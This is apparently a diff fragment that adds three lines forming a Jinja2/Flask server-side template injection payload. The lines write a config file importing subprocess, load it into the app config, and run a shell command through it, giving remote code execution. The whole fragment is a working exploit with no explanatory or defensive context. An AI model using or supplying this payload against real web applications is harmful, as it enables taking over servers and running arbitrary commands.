@@ -1,0 +1,3 @@
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
+{{ config.from_pyfile('/tmp/owned.cfg') }}
+{{ config['RUNCMD']('ls',shell=True) }}
